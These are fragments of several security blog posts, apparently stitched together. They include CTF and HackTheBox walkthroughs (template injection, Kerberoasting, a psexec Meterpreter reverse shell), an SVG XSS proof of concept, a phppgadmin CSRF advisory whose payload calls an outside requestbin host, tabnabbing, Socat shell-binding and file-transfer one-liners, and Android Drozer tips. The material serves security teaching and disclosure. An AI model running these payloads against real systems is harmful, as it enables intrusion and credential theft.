be seen below."

Server Side Template Injection is possible when an attacker can inject template directive as user input that can execute arbitrary code on the server. Some popular and widely used template engines are Smarty, Twig, Jinja2, FreeMarker, Velocity. More information regarding this vulnerability can be found here: https://portswigger.net/blog/server-side-template-injectionPresence of this vulnerability can be successfully identified by inserting a payload such as {\\{1 * 2\\}} which evaluates to 22.The tool tplmap was used to quickly exploit this vulnerability however that was found to be not possible.root@kali:~/tplmap# ./tplmap.py -u 'http://my.test.lab/?q=kk'[+] Tplmap 0.5    Automatic Server-Side Template Injection Detection and Exploitation Tool[+] Testing if GET parameter 'q' is injectable[+] Smarty plugin is testing rendering with tag *[+] Smarty plugin is testing blind injection[+] Dot plugin is testing blind injection[+] Dust plugin is testing rendering[+] Dust plugin is testing blind injection[+] Marko plugin is testing rendering with tag [+] Marko plugin is testing blind injection[+] Javascript plugin is testing rendering with tag '*'[+] Javascript plugin is testing blind injection[+] Php plugin is testing rendering with tag [+] Php plugin is testing blind injection[+] Ruby plugin is testing rendering with tag [+] Ruby plugin is testing blind injection[+] Ejs plugin is testing rendering with tag '*'[+] Ejs plugin is testing blind injection[!][checks] Tested parameters appear to be not injectableAfter looking through tplmap’s source code and by reading through the great methodology given by James Kettle of Portswigger (https://portswigger.net/blog/server-side-template-injection), the following can be done to identify what template is in use.By following the above methodology, it is possible to identify that the template in use in Jinja2 since it evaluates {7*‘7’}} to 7777777.Knowing that, enumeration of the application can now begin. The following global variables are available within Jinja2 templates by default:  config - the current configuration object  request - the current request object  session - the current session object  g - the request-bound object for global variables. This is usually used by the developer to store resources during a request.The configuration object can be called to retrieve the secret key used by the Jinja template. The Secret Key ‘UGhldmJoZj8gYWl2ZnZoei5wYnovcG5lcnJlZg==’ is the My token.Reverse TokenExamining the file downloaded from repository.test.lab, it looks to be an executable.root@kali:~/Downloads# file binbin: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=119ea32cf92d114f4c938989562717e2451414d9, not strippedroot@kali:~/Downloads# strings bin/lib64/ld-linux-x86-64.so.2libc.so.6__isoc99_scanfputsprintf__cxa_finalize__libc_start_main_ITM_deregisterTMCloneTable__gmon_start___Jv_RegisterClasses_ITM_registerTMCloneTableGLIBC_2.7GLIBC_2.2.5AWAVAAUATL[]A\\A]A^A_PASSWORD: %32sACCESS GRANTED!ACCESS DENIED!;*3$\"qk0Q5ZmS3au5RkcPuyotTjtg3G0bux3rQn8AiYpfA4rPUrL9Oxn1ET5vG8h7o7xba1aX9SLLbe3Fksvqtv7YhRoqtaw91ezunFb4dqPjHNnUoGJhC9u7gBdb9YWyCBxLHNnwB0GQNeVL5CGzMWjpuKfxDfqVPb1K3Z95TWpP8AjUCROxVRWwdciYZeALUOdXs9ZYhZfC1QJ648ks4T2osoLzdFizYgTNiAp6GHesRyGqYFR2nrI6eVsRBCg8wwuCkheitdX7MaAJUmiUcCKyRY8S3OCL6EYUZGu3qyV3h0SjtvcXydEFkDAY614ag0WzQm0WDrht1fHYMCwNJMX7JzyJZgs4uT44fMbNVxtoCJPmqaioEFrCNCAqUJJey5t59gnkzkuM7bp3nYaqneAL5PErwSZoDdHRpDCZ4rifJzZbXC3JCcdG8VXm4sb2dUHgcmHunusgo6mLm1k2mECv4twf9NFotmh0SH09vwZGljB1gBuxiEEWBVAyoEtMMfwHAWBbrLGVxIxW3SwxdLzGaJtwnTPkS0CIBEE08jI0dF1WwDZZjTMS3wnR8gn1Yl0P2wI2d3MAhcASlc7Jh3glOlRzHsCP6aYGPRkuaCnSV6PvKZR69c6ZdZmmSXcJhXaIfV3Z3hTeDSkDcB3tA6ErgkfACczshjOkRG2UK0t01h6Iu1mYoYNMwaDYOFLDdKbbh5RsV2d5xxvva4hNQCKAeImgyYv2VGsnU2UBCWM6LMfjTrPViCvE2iCoy2HFGlZu1E0kpCL4HsvT08R7MS1b7QOHmGjPRjej5rHeHjWfheNpO6fOcRKo8UaBIYy5Elmm9hNjolVactGp6W2ANee4x3TqQbhomXDCjxV1ieQfSW7jJBcBCNeEDy0tN0WKUzkXZQ6jg2CvZYAIr5jJUqoPBoKmgKEvbc2JbPnjBvCFSJOWjZQ4YTt8yl9Qg2iZ4BjCgamRgM6VyyM9UyvaigVutUkAo9xWcUmbzAICHvw3womkL80wKKeJG5nbkQR0ziw7GCC: (Debian 6.3.0-18+deb9u1) 6.3.0 20170516crtstuff.c__JCR_LIST__deregister_tm_clones__do_global_dtors_auxcompleted.6972__do_global_dtors_aux_fini_array_entryframe_dummy__frame_dummy_init_array_entrycrme.c__FRAME_END____JCR_END____init_array_end_DYNAMIC__init_array_start__GNU_EH_FRAME_HDR_GLOBAL_OFFSET_TABLE___libc_csu_fini_ITM_deregisterTMCloneTableputs@@GLIBC_2.2.5_edataprintf@@GLIBC_2.2.5__libc_start_main@@GLIBC_2.2.5__data_start__gmon_start____dso_handle_IO_stdin_used__libc_csu_initcheck_pw__bss_startmain_Jv_RegisterClasses__isoc99_scanf@@GLIBC_2.7__TMC_END___ITM_registerTMCloneTable__cxa_finalize@@GLIBC_2.2.5.symtab.strtab.shstrtab.interp.note.ABI-tag.note.gnu.build-id.gnu.hash.dynsym.dynstr.gnu.version.gnu.version_r.rela.dyn.rela.plt.init.plt.got.text.fini.rodata.eh_frame_hdr.eh_frame.init_array.fini_array.jcr.dynamic.got.plt.data.bss.commentBinary Ninja can be used to disassemble the binary and understand it better. Looking at the disassembled binary in graph view, it is expecting user input as a value password and is executing a function called check_pw and depending on the output and if the user value and password matches, they are sent to the correct branch.Looking at the check_pw function, the comparison of the user value and password value can be seen.The JE (Jump Equal) function can be modified to JNE (Jump not Equal) to match the condition to be true even if a wrong password is provided.Running the binary again, the access is granted however a token is not provided.Since the condition of this executable is based on a simple compare function, symbolic execution could be used to grant access to this binary. Symbolic execution (also symbolic evaluation) is a means of analyzing a program to determine what inputs cause each part of a program to execute. angr can be used to solve this. angr is a binary analysis platform written by the Computer Security Lab at UC Santa Barbara, SEFCOM at Arizona State University, and their associated CTF team, Shellphish for CTFs.Looking at angr documentation https://docs.angr.io/core-concepts/pathgroups, the following code can be used on the executableimport angrproject = angr.Project(\"./bin\")simgr = project.factory.simgr()simgr.explore(find=lamda s: b\"ACCESS GRANTED!\" in s.posix.dumps(1)s = simgr.found[0]print(s.posix.dumps(0))By running the Simulation manager, the “ACCESS GRANTED” state can be achieved and the reverse token can be obtained."

However, BloodHound is a better tool for this proces. Since we can’t psexec due to svc_tgs being a service account, runas can been used to start a shell as a low priv user. The following command can be used: runas /netonly /user:active.htb\\svc_tgs cmdOnce that is completed, The BloodHound C# Ingestor “SharpHound” can be used to enumerate LDAP and gather all domain information: .\\SharpHound.exe -c all -d active.htb –DomainController. You will need to ensure that your DNS server configuration on your windows machine is pointing to 10.10.10.100.Importing the SharpHound results into BloodHound and by looking at the results, it looks like the administrator user is kerberoastable due to the user being configured with a SPN.Kerberoasting involves extracting a hash of the encrypted material from a Kerberos “Ticket Granting Service” ticket reply (TGS_REP), which can be subjected to offline cracking in order to retrieve the plaintext password. This is possible because the TGS_REP is encrypted using the NTLM password hash of the account in whose context the service instance is running.Impacket’s GetUserSPNs.py script can be used to request the TGS of the administrator account and extract the hash of this for offline cracking. This can be achieved using Hashcat: hashcat -m 13100 hash.txt /usr/share/wordlists/rockyou.txt --force --potfile-disableHashcat successfully cracked the hash using the rockyou.txt wordlist and the plaintext password of this hash can be seen below.$krb5tgs$23$*Administrator$ACTIVE.HTB$active/CIFS~445*$373e34da642ae2f6fc55a66510e68ee7$9346f3dc8da4fa6b12e3fb663847fb755d729d12d55ca78f341056fd3d38845da008f17f0c08f35f13abd24bd51f4feb9febdcc1c2aa369f4c7d6ad42ce554570a45a933fdbc3f9d2f27be5c954cecd409863258da13af592cfa1765ab5b50fc566bcb4a68b1a00fce1a68d65b4d89a5ff93d1116744567370c052c1945dde973cbf610d5b257643fe4539b7f17d26b907aac87c9a4c493e8793c46eb6b1f8fdee32748261a17ecb6528ca343086109d515b731cc7cd020834df4bad5c47ff041995b4aaec1ca3a1063d47ceed63004ad25b824daff040539290567186632e7c611ee9a5519551d5968b077b944ee965d4de78927abe3bdfbd8b5d9061430904934d1fe44edf03100f63e64888a3268eb6c0ef66ef406dee14aa90ac0c8679ea7948ca2a9c5909aa054487be237017ad8dcf2c483bd750a35b67c813ef7998cde315d13d8429807c452dc865f134a2ba5a214f07594712f141a7f5af48d145e54d5e4c09d5942a29386f33a4773e3aa5dc3fa4fb271ee81e7daa3340339a44f2725a758cec4f7748727f7b018cab8dde4fbcefcbfab225d4ef910d863b6a4e37e039e0aff33825fd40be982e13946ee645ff72778fbe3c5fe10b695efb31bfca097afff3e1e0e8421fbd49334bab43017761293a2433b45aefc67f4abf809e0e3075b619f6b1e309924b6ae007632d9000c88038d547881787f5609398c810ca0a2d279a149df82759ddc59648a663ad8f764b45b915d170bf457f20e14a621f7ee4032bca48e9a0e2a2d6aa477e3e0375b7f4a2418aa0f6f5e06a2e2a307667eec40b6999fa6529a233f90092171ee09de00e6cc3b6f17f0a620c981bff474fed62d1f4211bce51fe28cae747ebaac12de512437aef20a05457051adec6ec65e649a570671360b107b3330b479af227910f9074f1abb26f7602a1821cff3b044c754909c8fbe164f69254bbcc8e6c2d026f9e973e364f7ad53b6b22c33a4fb1e8b7b8a5948133471172f9d4e01580b16105ee277a8136935f6be751753b1c8ea0bcd6b5d503884db5364b7485e4294935fc2129867b7918d17a56a4dacbda7f77f0dca04b1d6ccd0b5ded7f43f5721c9b22e37d07cea1c01caedf3a4324a7058452204baedf85d48cab02aeffc905aa054864fd128f2ca456d86ab0c97698df3fc3058233c95428d9c7ac54ed5aa603a4f21944576241f970ddd594d880372500bcffd677bde516ee75d18463dae717cef842de7bf7d9c03146:Ticketmaster1968                                                 Session..........: hashcatStatus...........: CrackedHash.Type........: Kerberos 5 TGS-REP etype 23Hash.Target......: $krb5tgs$23$*Administrator$ACTIVE.HTB$active/CIFS~4...c03146Time.Started.....: Thu Jul  4 19:55:19 2019 (27 secs)Time.Estimated...: Thu Jul  4 19:55:46 2019 (0 secs)Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)Guess.Queue......: 1/1 (100.00%)Speed.#1.........:   394.9 kH/s (6.04ms) @ Accel:32 Loops:1 Thr:64 Vec:8Recovered........: 1/1 (100.00%) Digests, 1/1 (100.00%) SaltsProgress.........: 10539008/14344385 (73.47%)Rejected.........: 0/10539008 (0.00%)Restore.Point....: 10534912/14344385 (73.44%)Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1Candidates.#1....: Tioncurtis23 -&gt; ThelittlemermaidStarted: Thu Jul  4 19:55:09 2019Stopped: Thu Jul  4 19:55:46 2019Using the password Ticketmaster1968, psexec can be used to login to the system and get root.txt. wmiexec from impacket and pth-wmis can also be used instead of MetaSploit psexec.msf5 &gt; use exploit/windows/smb/psexecmsf5 exploit(windows/smb/psexec) &gt; set RHOSTS 10.10.10.100RHOSTS =&gt; 10.10.10.100msf5 exploit(windows/smb/psexec) &gt; set SMBDomain active.htbSMBDomain =&gt; active.htbmsf5 exploit(windows/smb/psexec) &gt; setg SMBUser AdministratorSMBUser =&gt; Administratormsf5 exploit(windows/smb/psexec) &gt; setg SMBPass Ticketmaster1968SMBPass =&gt; Ticketmaster1968msf5 exploit(windows/smb/psexec) &gt; run[*] Started reverse TCP handler on 10.10.14.41:4444 [*] 10.10.10.100:445 - Connecting to the server...[*] 10.10.10.100:445 - Authenticating to 10.10.10.100:445|active.htb as user 'Administrator'...[*] 10.10.10.100:445 - Selecting PowerShell target[*] 10.10.10.100:445 - Executing the payload...[+] 10.10.10.100:445 - Service start timed out, OK if running a command or non-service executable...[*] Sending stage (179779 bytes) to 10.10.10.100[*] Meterpreter session 1 opened (10.10.14.41:4444 -&gt; 10.10.10.100:57298) at 2019-07-04 20:15:59 -0400The root hash can be found within the Administrator’s desktop.C:\\Users\\Administrator\\Desktop&gt;type root.txttype root.txtb5fc76d1d6b91d77b2fbf2d54d0f708bC:\\Users\\Administrator\\Desktop&gt;"

    "content": "Often when looking for Stored Cross-site scripting (XSS) vulnerabilities, file upload functionalities can be targeted. This will include trying to upload an HTML file or a Flash SWF file that contains malicious JavaScript. if it is possible successfully upload these file formats and view these stored files directly, then stored XSS is possible. Scalable Vector Graphics (SVG) file formats are often overlooked during this process. This short blog post will look at how SVG documents can be uploaded and leveraged to execute malicious JavaScript on a domain to achieve Stored XSS. Scalable Vector Graphics (SVG).Scalable Vector Graphics (SVG) can be used to define vector-based graphics within a webpage. SVG can be mixed with HTML content, as well as XML namespaces. SVG can be used to create interactivity within a webpage and perform animations. It should be noted that even though the MIME type for an SVG image is image/svg+xml. It is possible to store JavaScript code within an SVG document and execute it if viewed directly within a web browser. An example proof on concept for this can be seen below&lt;svg version=\"1.1\" baseProfile=\"full\" xmlns=\"http://www.w3.org/2000/svg\"&gt;    &lt;circle cx=\"50\" cy=\"50\" r=\"40\" stroke=\"black\" stroke-width=\"3\" fill=\"red\" /&gt;   &lt;script type=\"text/javascript\"&gt;      alert(document.domain);      alert(document.location);   &lt;/script&gt;&lt;/svg&gt;The above SVG document can be saved as a .svg file and can be opened and viewed within any browser to execute JavaScript which will display the current domain and the full URL of the domain that the the JavaScript is executing from.It is also possible to embed the above SVG document as part of a HTML page and when rendered, will execute the specified JavaScript. However, it is not possible execute JavaScript through SVG by loading an externally stored SVG file. For example, the following ways cannot be used to execute JavaScript within a webpage.&lt;img src=\"https://snoopysecurity.github.io/test.svg\" alt=\"test\" \"&gt;However, in certain scenarios an  element can be used to load and embed an SVG document externally.&lt;object id=\"test\" data=\"https://snoopysecurity.github.io/test.svg\"&gt;&lt;/object&gt;&lt;embed src=\"https://snoopysecurity.github.io/test.svg\" /&gt;Ghost Publishing PlatformGhost is an open source publishing platform which allows a user to create public and private blogs. It was found that during creation of a new blog post, upload of SVG files as document was allowed by the application.The below screenshot shows that an SVG file was successfully uploaded and rendered by the application.The image location of the stored SVG document can be visited to execute the stored JavaScript.Cross Site Scripting (XSS) allows clients to inject arbitrary scripting code into application and have the server return the script to the client in the response. This occurs because the application is taking untrusted data (in this example, as form of an SVG file) and storing it without performing any validation or encoding.This vulnerability could potentially be leveraged by an editor or an author of a post to steal the session of an administrator."

    "content": "Open-source intelligence (OSINT) refers to techniques used to collect data from publicly available sources that can be used for enumeration or attacking a target further. This blog post will provide information on certain well-known OSINT tools and how they can be used to collection and analyse information.10 Harpoon: an OSINT / Threat Intelligence toolLink: Harpoon: an OSINT / Threat Intelligence toolHarpoon is a quite recent addition to the OSINT field. Harpoon is a plugin-based tool and it can be used to search multiple services such as Malshare, Spyonweb, Certspotter, Binaryedge and Asn for data. The tool is also organised in plugins which makes it easier to write plugins to perform useful tasks. Furthermore, this tool seems more focused on threat hunting compared to bug bounty hunting and red teaming.9 - BinaryEdge Software as a serviceLink: BinaryedgeBinaryEdge is a platform that gathers data and makes the accessible for a user through their API. This platform is similar to Shodan; and provides information regarding exposed ports/services, banner grabs, torrent information, DNS queries and much more.8 - Hunter.ioLink: Hunter.ioWhen targeting an organisation, services such as search engines (e.g. Google, Yahoo, Bing) can be used to search for email addresses associated with a domain that a target organization uses for their business. Tools such as linkedin2username and ScrapedIn can also be used to scrape LinkedIn for potential targets without API restrictions for data reconnaissanceHunter.io can also be useful when trying to find email addresses related to a domain. The Hunter service is used for sales personnel to find contacts and leads for an organisation but this service can also be used to collect email addresses as well as names, job titles, and phone numbers.7 Censys.ioLink: Censys.ioCensys is a service that scans the Internet searching for devices and return aggregate reports on how resources (i.e. Devices, websites, and certificates) are configured and deployed. This service also provides a search engine that can be used to search for this information. Due to its feature of showing real-time data, this service can often be useful for bug bounty hunters to quickly map out easy targets.The below search is an example of looking for any service/server with its SSL/TLS certificate that can correlates to the search term “PayPal”The above search utilises Certificate Transparency. Certificate Transparency by design contains all the certificates issued by a participating CA for any given domain. Search engines such as crt.sh also collects this data.6 Open Source Intelligence Browser ExtensionLink: Open Source Intelligence Browser ExtensionThe Open Source Intelligence Browser extension that can be used to quickly search for information by leveraging the Chrome browser. This extension can be useful during Intelligence (OSINT) Investigations. This includes username, telephone, domain and company searches.5 WhatWeb ScannerLink: WhatWeb ScannerWeb technologies including content management systems (CMS), blogging platforms, statistic/analytics packages, JavaScript libraries, web servers, and embedded devices. WhatWeb has over 1700 plugins, each to recognise something different. WhatWeb also identifies version numbers, email addresses, account IDs, web framework modules, SQL errors, and more.WhatWeb is a scanner that conducts web application fingerprinting. This technique often be useful for bug bounty hunters. WhatWeb contains over 1700 plugins which can be customised and used for fingerprinting and can be used to gather information on a variety of application servers including Content Management Systems, Application servers and web application dashboards. An example of WhatWeb scanner in use can be seen below:$ ./whatweb exampletargetsite.com/forum/http://exampletargetsite.com/forum/ [200] PasswordField[password], HTTPServer[Apache/2.2.15], PoweredBy[phpBB], Apache[2.2.15], IP[88.198.177.36], phpBB[2], PHP[5.2.13], X-Powered-By[PHP/5.2.13], Cookies[phpbb2mysql_data,phpbb2mysql_sid], Title[Smartors Mods Forums - Reloaded], Country[GERMANY][DE]4 Intrigue.ioLink: Intrigue.ioIntrigue.io is a framework that was created for automated attack surface discovery. This framework can be used for port scanning, service discovery, DNS recon as well as search for third party services such as Pastebin, Github etc. Intrigue.io also contains a web interface which can be used to quickly configure and start automated discovery scans. Intrigue.io can also be used as a Vagrant or docker container. I prefer to use Aquatone these days for attack surface discovery3 AquatoneLink: AquatoneAquatone is a well-supported and updated tool that can be used to scan large number of hosts and quickly get information regarding an organization’s attack surface. Aquatone has several features including DNS enumeration, port scanning, as well as screenshotting and reporting. Aquatone can also be easily integrated with existing toolsets with minimal effort.2 Recon-NgLink: Recon-ngRecon-Ng is an extremely powerful web reconnaissance framework which can be used by security consultants to gather OSINT data quickly. Recon-Ng follows a modular approach similar to the MetaSploit framework, and also provides useful usability features such as interactive help, and command completion. Recon-Ng contains numerous modules including DNS, Email and Web application reconnaissance. Numerous bug bounty scripts/wrappers have utilised Recon-Ng in the past including enumall.py by @Jhaddix.1 SpiderFootLink: SpiderFootSpiderFoot is an open source intelligence (OSINT) reconnaissance tool that can be used to gather IP addresss, domain names, hostnames, network subnets, ASNs, e-mail addresses of a given search name. SpiderFoot can be used to query over 100 public data sources (OSINT) and is updated monthly with updates. SpiderFoot can also be configured with public data source APIs; a full list of documentation can be found here: https://www.spiderfoot.net/documentation/Concluding thoughtsMost of these tools can be used to gather port scan information, search engine dorks, python scripting, passive DNS, Threat intelligence, data visualization, Social Media, SSL/TLS certificates, WHOIS, Autonomous System (AS) Numbers, Cloud information, Wayback Machine, Web crawling, mail exchange information and much more. These are a few tools I use on a regular basis.Honourable mentions: Wapplyzer, Trape, EagleEye, RiskIQ, Skiptracer, Sn1per, Dnsdumpster, Gitrob"

    "content": "This advisory discloses a CSRF vulnerability that exists in phppgadmin/phppgadmin. The details that was sent to the maintainer can be seen here: phppgadmin%20CSRF%20Vulnerability.pdfCSRF IntroductionWhen a web server receives a request, the request should be validated before it initiates any action on the server. Checking the session ID or authorisation cookie is not sufficient, because these cookies are sent automatically by a user’s browser even if the user did not knowingly make the request.The SQL dashboard area within phppgadmin allows sensitive actions to be performed without validating that the request originated from the application. This could enable an attacker to trick a user into performing these actions unknowingly through a Cross Site Request Forgery (CSRF) attack.ImpactBy leveraging this vulnerability, an attacker might be able to gain unauthorized access to information, stored in database, execute arbitrary commands on the server, compromise the entire application and perform attacks against application users and company’s infrastructure.Multiple areas within the application is vulnearable to CSRF. One such area is the database.php webpage.The vulnerability exists due to failure in the database.php webpage not verifying the source of HTTP request. A remote attacker can trick a logged-in administrator to visit a malicious page with CSRF exploit and execute arbitrary system commands on the server.The proof of concept below when visited, will send a HTTP POST request to vulnerable application and instructs the backend postgres database to make a HTTP request to an attacker-controlled server by utilising the CREATE command.Proof of Concept to identify if a phppgadmin instance is vulnerable through Out of Band Technique&lt;html&gt;&lt;body&gt;&lt;script&gt;history.pushState('', '', '/')&lt;/script&gt;&lt;script&gt;function submitRequest(){var xhr = new XMLHttpRequest();xhr.open(\"POST\", \"http:\\/\\/phppgadmin.local:49161\\/phppgadmin\\/sql.php\", true);xhr.setRequestHeader(\"Accept\",\"text\\/html,application\\/xhtml+xml,application\\/xml;q=0.9,*\\/*;q=0.8\");xhr.setRequestHeader(\"Accept-Language\", \"en-GB,en;q=0.5\");xhr.setRequestHeader(\"Content-Type\", \"multipart\\/form-data;boundary=---------------------------317222262731323\");xhr.withCredentials = true;var body = \"-----------------------------317222262731323\\r\\n\" +\"Content-Disposition: form-data; name=\\\"query\\\"\\r\\n\" +\"\\r\\n\" +\"CREATE EXTENSION dblink;SELECTdblink_connect(\\'host=mydatahere.b940ab686a17804777c0.d.requestbin.net user=postgrespassword=password dbname=dvdrental\\');\\r\\n\" +\"-----------------------------317222262731323\\r\\n\" +\"Content-Disposition: form-data; name=\\\"MAX_FILE_SIZE\\\"\\r\\n\" +\"\\r\\n\" +\"2097152\\r\\n\" +\"-----------------------------317222262731323\\r\\n\" +\"Content-Disposition: form-data; name=\\\"script\\\"; filename=\\\"\\\"\\r\\n\" +\"Content-Type: application/octet-stream\\r\\n\" +\"\\r\\n\" +\"\\r\\n\" +\"-----------------------------317222262731323\\r\\n\" +\"Content-Disposition: form-data; name=\\\"execute\\\"\\r\\n\" +\"\\r\\n\" +\"Execute\\r\\n\" +\"-----------------------------317222262731323\\r\\n\" +\"Content-Disposition: form-data; name=\\\"server\\\"\\r\\n\" +\"\\r\\n\" +\"localhost:5432:allow\\r\\n\" +\"-----------------------------317222262731323\\r\\n\" +\"Content-Disposition: form-data; name=\\\"database\\\"\\r\\n\" +\"\\r\\n\" +\"postgres\\r\\n\" +\"-----------------------------317222262731323--\\r\\n\";var aBody = new Uint8Array(body.length);for (var i = 0; i &lt; aBody.length; i++)aBody[i] = body.charCodeAt(i);xhr.send(new Blob([aBody]));}&lt;/script&gt;&lt;form action=\"#\"&gt;&lt;input type=\"button\" value=\"Submit request\" onclick=\"submitRequest();\" /&gt;&lt;/form&gt;&lt;/body&gt;&lt;/html&gt;dblink_connect() establishes a connection to a remote PostgreSQL database.

ensure that all requests originate from the user knowingly interacting with the application, each request to a sensitive function should include a single-use authentication token. Such tokens are normally included on each page in a hidden form field, which would be included in the request when the form is submitted. The server keeps a copy of the token valid for the user’s session, and checks if the two values match after receiving the request. The tokens often consist of twenty or more random characters, an example of which is given below.8D086769FC4B3B058F7FCB0BB37645BA77444AFAFurther Information  https://www.owasp.org/index.php/Cross-Site_Request_Forgery_(CSRF)_Prevention_Cheat_Sheet"

    "content": "The HTML &lt;a&gt; element, also known as anchor element is used within webpages to create an hyperlink to another resource. The anchor tag can also be specified with several attributes, one of them being the target attribute. An example can be seen below. Usage of certain attributes can often introduce vulnerabilities in a web application.Example Link:Click HereThe target attribute specifies the context in where the linked resource will open when the it is clicked by a user. The target attribute supports many values such as _blank, _parent and _top. The most interesting of these values is the “_blank” value. If the target attribute is used with the “_blank” value, the resource used as link will open in a new tab, or a new window in older browsers.However, it was discovered a while back that a link opened via target blank attribute can make changes to the original page, essentially bypassing same origin policy restrictions. An example of this are as follows.Click Here for a POCClicking the above link will take you to a webpage with the following JavaScript code:&lt;script&gt;window.opener.location = 'https://media.makeameme.org/created/hacked.jpg';&lt;/script&gt;In the above code, the window.opener.location property is used to redirect a user from the initial clicked webpage to an attacker controlled webpage. This could be leveraged to conduct phishing attacks on the initial webpage since the window.opener object has access to the page from where the user clicked the link. However, it should be noted that it is not possible to execute JavaScript on the initial page since the window.opener object only has partial access (TLDR: you can only control the location attribute of the window object so only redirection is possible).To make detection of this vulnerability easier, I wrote a Burp Plugin which can be found here: https://github.com/snoopysecurity/Noopener-Burp-ExtensionThe following article also shows a real-world example of this vulnerability: https://dev.to/ben/the-targetblank-vulnerability-by-exampleTo prevent pages from abusing this vulnerability, the “noopener” and “noreferrer” attribute can be used. An example of this is shown below:&lt;a href=\"http://snoopysecurity.github.io\" target=\"_blank\" rel=\"noopener noreferrer\"&gt;Click Me&lt;/a&gt;For older browsers, The “noreferrer” attribute will need to be used since certain browsers such as Firefox doesn’t support the “noopener” attribute.References:  https://mathiasbynens.github.io/rel-noopener/"

    "content": "Socat is a network swiss army knife utility and it is very similar to Netcat. However, Socat has many additional features that makes it a better alternative to Netcat. Socat also has advanced features such as listeners for multiple clients, different protocols, reusing connections, connection redirection etc. The following are some few examples of how to use Socat and how it can be a very useful tool during assessments.Socat ListenerThe following command tells Socat to use the TCP protocol and listen on port 123 and print any given information from a client to the terminal(STDOUT). The TCP value can be changed and specific versions can be used such as TCP4, TCP6, TCP4-LISTEN, and TCP6-LISTEN. The TCP value can also be changed to emulate a UDP listener.socat TCP4-LISTEN:123 STDOUTTo connect to this server, the following command can be issued.socat TCP:192.168.1.81:123 -&gt; helloThis will send the world hello to the socat listener listening on port 123.Something similar to the following can also be issued to take something from STDIN and send that to a listener.whoami | socat STDIN TCP:192.168.1.81:123A useful example of this would be the below where a UDP packet can be created from STDIN and send to a host using socat.echo “UDP packet” | Socat STDIO UDP4-DATAGRAM:192.168.2.1:123Reverse ShellThe below one liner is an example of binding the bash shell to a port and connecting to it.root@kali:~/test# socat TCP-LISTEN:1337 EXEC:/bin/bashSocat web serverTo start a web server with Socat, the following command can be issued. The -v option tells Socat to be verbose and the -T option can be used to set timeouts.socat -v -T0.05 tcp-l:80,reuseaddr,fork system:\"echo 'HTTP/1.1 200 OK'; echo 'Connection: close'; echo; cat\"HTTPS serverSocat can also be used to setup HTTPS servers. In the below example, a self-signed certificate is created using Openssl and it is used to setup a HTTPS server.openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365cat key.pem &gt;&gt; cert.pem socat OPENSSL-LISTEN:443,cert=/root/test/cert.pem -The following command can also be using as an alternative to Openssl client and connect to services using SSL/TLS.socat - OPENSSL:192.168.1.81:443Terminal EmulationIn scenarios where commands need to be issued to a network medium without using a terminal emulator, the following command can be useful.socat READLINE,history:/tmp/serialcommands.txt \\  OPEN:/dev/ttyS0,ispeed=9600,ospeed=9600,crnl,raw,sane,echo=falseRedirecting TrafficIn scenarios where you want to take incoming connections and redirect it to a Linux application, the following command can be used.socat TCP-LISTEN:443,reuseaddr,fork UNIX-CLIENT:/tmp/fooYou can also specify the bind address and specify what IP ranges can connect to this listener. The su=nobody value will ensure that forked processes will run as the nobody low-privileged usersocat TCP-LISTEN:443,bind=127.0.0.1,reuseaddr,fork,su=nobody,range=127.0.0.0/8 UNIX-CLIENT:/tmp/fooTunnellingSocat can also be a good alternative to SSH when looking for a way to tunnel traffic. The following command can be used on a victim host to capture incoming traffic from port 1022 and send it to 192.168.1.70:22socat TCP4-LISTEN:1022,reuseaddr,fork TCP4:192.168.1.70:22File transferFile transfers can also be conducted with ease using Socat.socat FILE:data.txt TCP:192.168.1.81:1337socat TCP-LISTEN:1337 OPEN:data.txt,creat,truncHowever, since Socat isn’t available by default on most systems, Netcat is a better/easier option during post exploitation phases. The static compiled binary version for Socat can be found here if installation in not possible: https://github.com/andrew-d/static-binaries"

    "content": "1 : Intent SniffingIntent sniffing is an attack vector use to capture exposed intents. In certain cases, applications will broadcast intents and will not define any permissions that in need to receive the intent. This can then be captured by a malicious application. So passing sensitive data via Intents might potentially be dangerous. A popular tool used by most consultants (Link here)[https://www.nccgroup.trust/us/about-us/resources/intent-sniffer/)] called intent sniffer can be used. But it is possible to test for this vulnerability using Drozer.Drozer has a module calledapp.broadcast.sniffwhich can be used to sniff rogue intents. The below example is Drozer capturing all intents sent to battery changed receiver.2 : Finding debuggable applications quicklyIf application is marked as debuggable, then a user can step through code, view variable values, and pause execution of an application. This can be very useful for an attacker since he can try to run arbitrary code under that application permission, hook into certain methods and modify set variables.Drozer has a module calledapp.package.debuggablewhich can be used to find exploitable applications. This simply looks for android:debuggable value in the AndroidManifest.xml but it is a more efficient way of searching for debuggable applications.3 : Finding applications with backup enabledAndroid functionality allows backups and restoration of its data without having root permissions. This feature of android uses ADB backup that allows applications to be backed up to the cloud. This means that if a user replaces or wipes their phone, they can restore app settings. But if an attacker can get physical access to the device and take the backup of the app, he can modify the headers and restore it to the application’s original state.This is a low hanging vulnerability but it is still useful to find in applications. As always, the Drozer module runapp.package.backupcan be used to find applications with backup flag enabled in its manifest file.4 : Capturing Clipboard content with DrozerAll android mobile system has a clipboard which is used by all applications installed on the device. In certain scenarios, applications will store sensitive values such as passwords which can be read and altered by any application. More information about clipboard here: http://developer.android.com/reference/android/content/ClipboardManager.htmlThe drozer module post.capture.clipboard can be used to view clipboard content from any application. It should be noted that the clipboard module will need to be installed in Drozer first.5 : AddJavaScriptInterface Arbitrary Code ExecutionThe Add JavaScript Webview code execution is a vulnerability found in most applications. WebView supports usage of JavaScript which allows execution of remote code through a man in the middle attacker.The Drozer module scanner.misc.checkjavascriptbridge can very useful when trying to identify the vulnerability. By running the commandrun scanner.misc.checkjavascriptbridgeit is possible to identify vulnerable applications6 : Rebuilding Drozer Agent with permissionsBy default, Drozer agent apk only comes with internet access permission. Sometimes you might have to rebuild Drozer agent with certain permissions for various tasks. e.g. Querying permission protected providers, testing custom permissions etc.This can be done in command line by using    Drozer agent build --permission android.permission.[PERMISSION YOU WANT]This is easier than decompiling the app, making edits to the manifest and recompiling again.Bonus : Drozer built in scanning capabilitiesOther useful commands that are worth knowingscanner.provider.injection - Test content providers for SQL injection vulnerabilities.scanner.provider.sqltables - Show all table names accessible through any SQL injection vulnerabilities.scanner.provider.traversal - Test content providers for directory traversal.scanner.misc.readablefiles &amp; writablefiles - Find world-readable files and world-writable files in the given folder. This is easier than browsing each possible directories and using 